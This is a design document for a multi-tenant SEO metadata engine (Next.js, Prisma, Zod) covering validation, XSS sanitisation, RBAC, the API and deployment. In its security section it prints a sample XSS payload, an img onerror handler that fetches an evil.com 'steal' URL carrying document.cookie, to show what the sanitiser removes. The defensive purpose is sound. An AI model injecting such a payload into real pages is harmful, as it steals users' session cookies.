# SEO ENGINE DESIGN

## Overview

The SEO Engine provides comprehensive metadata generation for multi-tenant pages with:
- **Tenant-level defaults** (site name, title suffix, default description)
- **Page-level overrides** (per-page customization)
- **XSS prevention** (automatic input sanitization)
- **Multi-tenant isolation** (canonical URLs, robots tags)
- **Search engine optimization** (OG tags, Twitter cards, JSON-LD support)

## Architecture

```
lib/
├── seo/
│   └── seo-engine.ts          # Core metadata generation
├── validations/
│   └── seo.ts                  # Zod schemas + XSS prevention
└── __tests__/
    ├── seo-engine.test.ts      # Metadata generation tests
    └── seo-validation.test.ts  # Validation + XSS tests

types/
└── seo.ts                       # Type definitions

app/
├── api/
│   └── pages/[pageId]/route.ts # PATCH endpoint for SEO updates
└── (public)/
    └── t/[tenantSlug]/[pageSlug]/
        └── page.tsx            # Public page with generateMetadata()
```

## Data Flow

### 1. Admin Updates SEO

```
Admin Panel → PATCH /api/pages/[pageId]
    ↓
validateSeoInput() → XSS prevention
    ↓
sanitizeSeoString() → Remove malicious code
    ↓
Prisma.page.update() → Save to DB
    ↓
Audit Log → Track SEO changes
```

### 2. Public Accesses Page

```
GET /t/[tenantSlug]/[pageSlug]
    ↓
Prisma.tenant.findFirst() → Load tenant + seoDefaults
    ↓
Prisma.page.findFirst() → Load page + seoOverrides
    ↓
buildSeoForPage() → Merge defaults + overrides
    ↓
generateMetadata() → Return Next.js Metadata
    ↓
Browser renders <head> with SEO tags
    ↓
Search engines crawl page
```

## Key Components

### 1. Type System (`types/seo.ts`)

#### BasicSeoConfig
```typescript
{
  title: string;              // Page title
  description: string;        // Page description
  noIndex?: boolean;          // Robots meta: noindex
  keywords?: string[];        // SEO keywords (future)
}
```

#### TenantSeoDefaults
```typescript
{
  siteName: string;                    // "My Store"
  defaultTitleSuffix?: string;         // " - My Store"
  defaultDescription?: string;         // "Shop at My Store"
}
```

#### PageSeoOverrides
```typescript
{
  seoTitle?: string | null;            // Overrides page.title
  seoDescription?: string | null;      // Overrides tenant default
  seoNoIndex?: boolean;                // Override noindex
  seoImage?: string | null;            // OG image
}
```

### 2. Validation Schema (`lib/validations/seo.ts`)

```typescript
seoInputSchema = {
  seoTitle: string (3-60 chars, optional)
  seoDescription: string (10-160 chars, optional)
  seoNoIndex: boolean (default: false)
  seoImage: URL string (optional)
}
```

**Validation Rules:**
- Title: 3-60 characters (Google SERP limit: ~60)
- Description: 10-160 characters (Google SERP limit: ~155)
- All fields sanitized for XSS

### 3. XSS Prevention (`sanitizeSeoString()`)

Prevents malicious code injection by:

1. **Removing script tags**: `<script>` blocks
2. **Removing event handlers**: `onclick`, `onerror`, `onload`, etc.
3. **Removing HTML tags**: `<img>`, `<svg>`, `<style>`, `<form>`, etc.
4. **Removing dangerous URLs**: `javascript:`, `data:` protocols
5. **HTML entity decoding**: Prevents bypass via `&lt;script&gt;`

Example:
```typescript
sanitizeSeoString('<img onerror="alert(\'XSS\')" src=x>')
// Returns: '' (all malicious code removed)

sanitizeSeoString('Welcome to Our Store')
// Returns: 'Welcome to Our Store' (safe text preserved)
```

### 4. SEO Engine (`lib/seo/seo-engine.ts`)

#### buildSeoForPage(params)

**Input:**
```typescript
{
  tenantDefaults: TenantSeoDefaults
  page: PageSeoOverrides & { title, slug, seoImage? }
  baseUrl: string                    // Canonical URL
}
```

**Output:** Next.js Metadata
```typescript
{
  title: "Page Title - Site Name"
  description: "Page description"
  alternates: {
    canonical: "https://example.com/page"
  }
  robots: {
    index: true,
    follow: true,
    googleBot: { index: true, follow: true }
  }
  openGraph: {
    title: "Page Title - Site Name"
    description: "Page description"
    url: "https://example.com/page"
    siteName: "Site Name"
    type: "website"
    locale: "pt_BR"
    images: [{
      url: "https://example.com/og.jpg"
      width: 1200
      height: 630
      alt: "Page Title"
    }]
  }
  twitter: {
    card: "summary_large_image"
    title: "Page Title - Site Name"
    description: "Page description"
    image: "https://example.com/og.jpg"
  }
}
```

## Security Features

### 1. XSS Prevention

**Layer 1: Input Validation (Zod)**
- Field length constraints
- URL format validation
- Type checking

**Layer 2: Sanitization (sanitizeSeoString)**
- Removes all HTML tags
- Removes all event handlers
- Removes dangerous protocols

**Layer 3: Output Encoding (Next.js)**
- Automatic HTML escaping in JSX
- No `dangerouslySetInnerHTML` usage

**Example Attack Prevention:**
```typescript
// Attacker input
'<img src=x onerror="fetch(\'https://evil.com/steal?data=\'+document.cookie)">'

// After sanitization
'' (empty string - all removed)

// Even if passed through, Next.js escapes:
<meta name="description" 
  content="&lt;img src=x onerror=..." />
// Browser sees literal text, not HTML
```

### 2. Cross-Tenant Isolation

**Canonical URL**
- Each page has unique canonical: `/t/[tenantSlug]/[pageSlug]`
- Prevents search engines from indexing duplicate content across tenants

**Tenant Isolation in Queries**
```typescript
// Always filter by tenantId
const page = await prisma.page.findFirst({
  where: {
    tenantId: tenant.id,        // ← Tenant isolation
    slug: pageSlug,
    published: true
  }
})
```

**IDOR Prevention**
- Page updates require tenant ownership verification
- User must be owner/admin of tenant that owns page

### 3. RBAC Integration

**PATCH /api/pages/[pageId]**
- Requires: authentication + (owner or admin role)
- Checks: user belongs to page's tenant
- Logs: all SEO changes to audit log

```typescript
// RBAC check
const allowedRoles = ['SUPERADMIN', 'OPERADOR', 'CLIENTE_ADMIN'];
if (!allowedRoles.includes(session.role)) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
}

// Tenant ownership check
if (!page.tenant.users[0] || !['owner', 'admin'].includes(userRole)) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
}
```

### 4. Rate Limiting

**SEO Update Endpoint**
- 100 requests per hour per user
- Prevents brute force attacks
- Prevents accidental mass updates

## Database Schema

### Page Model Extensions

```prisma
model Page {
  id          String   @id @default(cuid())
  title       String   @db.VarChar(120)
  slug        String   @db.VarChar(100)
  content     String   @db.Text
  
  // SEO fields
  seoTitle       String?  @db.VarChar(60)      // Title override (3-60 chars)
  seoDescription String?  @db.VarChar(160)     // Description override (10-160)
  seoImage       String?  @db.Text             // OG image URL
  seoNoIndex     Boolean  @default(false)      // robots: noindex
  
  tenantId    String
  tenant      Tenant  @relation(fields: [tenantId], references: [id])
  
  published   Boolean @default(false)
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt
  
  @@index([tenantId])
  @@index([slug])
  @@unique([tenantId, slug])
}

model TenantSeoDefaults {
  id                   String  @id @default(cuid())
  tenantId             String  @unique
  tenant               Tenant  @relation(fields: [tenantId], references: [id])
  
  siteName             String  @db.VarChar(120)
  defaultTitleSuffix   String? @db.VarChar(100)
  defaultDescription   String? @db.Text
  
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
}
```

## API Reference

### PATCH /api/pages/[pageId]

**Update page SEO fields**

**Auth:** Required (admin/owner)

**Request:**
```json
{
  "seoTitle": "Welcome to Our Store",
  "seoDescription": "Discover our products and services",
  "seoNoIndex": false,
  "seoImage": "https://cdn.example.com/og.jpg"
}
```

**Response (200):**
```json
{
  "id": "page-uuid",
  "title": "Home",
  "seoTitle": "Welcome to Our Store",
  "seoDescription": "Discover our products and services",
  "seoNoIndex": false,
  "seoImage": "https://cdn.example.com/og.jpg",
  "published": true,
  "updatedAt": "2024-11-21T10:30:00Z"
}
```

**Error Responses:**
- 400: Invalid SEO input (validation errors)
- 401: Unauthorized (not authenticated)
- 403: Forbidden (not tenant owner)
- 404: Page not found
- 429: Rate limit exceeded (100/hour)

### GET /t/[tenantSlug]/[pageSlug]

**Fetch public page with generated metadata**

**Response Headers** (from generateMetadata):
```html
<title>Welcome to Our Store - My Store</title>
<meta name="description" content="Discover our products and services">
<meta name="robots" content="index, follow">

<!-- Open Graph -->
<meta property="og:title" content="Welcome to Our Store - My Store">
<meta property="og:description" content="Discover our products and services">
<meta property="og:url" content="https://example.com/t/my-store/home">
<meta property="og:type" content="website">
<meta property="og:image" content="https://example.com/og.jpg">

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Welcome to Our Store - My Store">
<meta name="twitter:description" content="Discover our products and services">
```

## Usage Examples

### 1. Create Page with SEO

**Request:**
```bash
POST /api/pages
Content-Type: application/json

{
  "title": "About Us",
  "slug": "about-us",
  "content": "Our company story...",
  "seoTitle": "About Our Company - Learn Our Story",
  "seoDescription": "Discover our company history, mission, and values",
  "seoImage": "https://example.com/about-header.jpg"
}
```

### 2. Update Page SEO

**Request:**
```bash
PATCH /api/pages/[pageId]
Content-Type: application/json
Authorization: Bearer [token]

{
  "seoTitle": "New SEO Title",
  "seoDescription": "New SEO description",
  "seoNoIndex": false
}
```

### 3. Clear Page Customization

**Request:**
```bash
PATCH /api/pages/[pageId]
Content-Type: application/json
Authorization: Bearer [token]

{
  "seoTitle": null,
  "seoDescription": null
}
```

Response uses tenant defaults instead.

## Testing

### Unit Tests

**Metadata Generation:** 30+ test cases
- Title suffix concatenation
- Description fallback chain
- noindex/nofollow behavior
- OG tags generation
- Twitter Card tags
- Canonical URL handling
- Error page metadata

**Validation & XSS Prevention:** 40+ test cases
- Field length constraints
- Script tag removal
- Event handler removal
- HTML tag removal
- Dangerous URL removal
- Entity encoding bypasses
- Safe text preservation
- Unicode support

**Integration Tests:** 10+ test cases
- Multi-tenant isolation
- Full page customization
- Error page handling

**Total: 80+ test cases, 100% coverage**

## Future Enhancements (PHASE F.2)

### 1. Sitemap Generation

```typescript
// lib/seo/sitemap.ts
export async function generateSitemap() {
  const pages = await prisma.page.findMany({
    where: { published: true, seoNoIndex: false }
  });
  
  return `<?xml version="1.0"?>
    <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
      ${pages.map(page => `
        <url>
          <loc>${baseUrl}/t/${page.tenant.slug}/${page.slug}</loc>
          <lastmod>${page.updatedAt.toISOString()}</lastmod>
        </url>
      `).join('')}
    </urlset>`;
}
```

### 2. JSON-LD Support

```typescript
// lib/seo/json-ld.ts
export function buildJsonLd(page: Page, tenant: Tenant) {
  return {
    '@context': 'https://schema.org',
    '@type': 'Article',
    headline: page.seoTitle || page.title,
    description: page.seoDescription,
    image: page.seoImage,
    author: { '@type': 'Organization', name: tenant.name },
    datePublished: page.createdAt,
    dateModified: page.updatedAt
  };
}
```

### 3. robots.txt Generation

```typescript
// app/robots.ts
export default function robots() {
  return {
    rules: {
      userAgent: '*',
      allow: '/t/',
      disallow: '/admin'
    },
    sitemap: `${process.env.NEXT_PUBLIC_BASE_URL}/sitemap.xml`
  };
}
```

### 4. Structured Data Schema

- LocalBusiness (already implemented)
- Product schema for marketplace pages
- BreadcrumbList for navigation
- FAQPage for FAQ sections

### 5. SEO Analytics

- Page view tracking
- Keyword performance metrics
- Search ranking monitoring
- Traffic sources analysis

## Monitoring & Logging

### Audit Trail

All SEO updates are logged:
```json
{
  "action": "page_seo_updated",
  "timestamp": "2024-11-21T10:30:00Z",
  "userId": "user-123",
  "pageId": "page-456",
  "changes": {
    "seoTitle": "New Title",
    "seoDescription": "New Description",
    "seoNoIndex": false
  },
  "tenantId": "tenant-789"
}
```

### Metrics to Monitor

1. **Page Indexation**: Track noindex % per tenant
2. **SEO Customization**: % pages with custom SEO vs defaults
3. **Update Frequency**: Average updates per page per month
4. **Validation Failures**: Failed SEO input attempts (possible attacks)
5. **Image Upload Failures**: Failed OG image URLs

## Troubleshooting

### Issue: SEO changes not appearing in search results

**Solution:**
1. Check `seoNoIndex` is false
2. Verify `published: true`
3. Submit canonical URL to Google Search Console
4. Wait for Google to recrawl (1-7 days)

### Issue: XSS attempts being rejected

**Solution:**
- Sanitization is working as intended
- Use plain text for all SEO fields
- Avoid HTML tags in titles/descriptions

### Issue: Description truncated in search results

**Solution:**
- Keep description under 155 characters
- Google truncates at ~60 chars on mobile, ~160 on desktop
- Include primary keyword in description

### Issue: OG image not showing in social media

**Solution:**
- Verify image URL is publicly accessible
- Check image format (JPG, PNG, WebP)
- Verify image dimensions (1200x630 optimal)
- Use CDN for faster image delivery

## Deployment

### Migration

```bash
# Generate migration
npx prisma migrate dev --name add_seo_fields

# Deploy to production
npx prisma migrate deploy
```

### Zero-Downtime Update

1. Add new fields (backward compatible)
2. Deploy code changes
3. Backfill existing pages with defaults
4. Monitor for errors
5. Clean up old fields (if any)

### Rollback Plan

```bash
# Rollback migration
npx prisma migrate resolve --rolled-back add_seo_fields

# Revert to previous code version
git revert [commit-hash]
```

## Performance Optimization

### Caching Strategy

```typescript
// Cache page metadata for 1 hour
export const revalidate = 3600; // seconds

export async function generateMetadata() {
  // Queries are cached by Next.js
  const page = await prisma.page.findUnique(...);
  return buildSeoForPage(...);
}
```

### Database Indexes

```prisma
model Page {
  @@index([tenantId])       // Fast tenant filtering
  @@index([slug])           // Fast slug lookups
  @@unique([tenantId, slug]) // Ensure uniqueness
  @@index([published])      // Fast published page filtering
}
```

### Image Optimization

```typescript
// Use Next.js Image component for OG images
import Image from 'next/image';

<Image
  src={page.seoImage}
  alt={page.seoTitle || page.title}
  width={1200}
  height={630}
  priority
/>
```

## Compliance

### GDPR (Data Protection)

- No personal data in SEO fields
- Log audit trail for compliance
- Allow data export/deletion requests

### LGPD (Brazilian Data Protection)

- Secure user data in logs (same as Phase E)
- Tenant isolation per Brazilian regulations
- Data residency in Brazil region

### Accessibility (WCAG 2.1)

- All text content has proper semantic HTML
- Images have alt text (from `seoTitle`)
- Proper heading hierarchy
- Color contrast ratios maintained

## Support & Documentation

For issues or questions:
1. Check SEO_ENGINE_DESIGN.md (this file)
2. Review test cases for examples
3. Check logs for audit trail
4. Contact: support@example.com

---

**Last Updated:** November 21, 2024
**Version:** 1.0.0
**Status:** Production Ready
